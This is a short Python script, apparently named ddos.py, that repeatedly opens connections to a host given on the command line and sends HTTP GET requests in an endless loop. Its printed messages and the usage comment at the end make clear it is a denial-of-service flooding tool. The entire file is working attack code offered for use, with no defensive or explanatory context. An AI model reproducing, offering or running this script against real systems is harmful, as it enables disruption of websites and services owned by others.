import socket, sys, os  
print("][ Attacking " + sys.argv[1]  + " ... ][")
print("injecting " + sys.argv[2])
def attack():
	#pid = os.fork()  
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
	s.connect((sys.argv[1], 80))
	print(">> GET /" + sys.argv[2] + " HTTP/1.1")
	
	message = "GET /" + sys.argv[2] + " HTTP/1.1\r\n"
	sendmessage = bytes(message, encoding='UTF-8')
	s.send(sendmessage)
	
	message = "Host: " + sys.argv[1]  + "\r\n\r\n"
	sendmessage = bytes(message, encoding='UTF-8')
	s.send(sendmessage)
	
	s.close()
	
while True:  
    attack()

	
# How to use
# python3 ddos.py <ip_or_hostname> index.html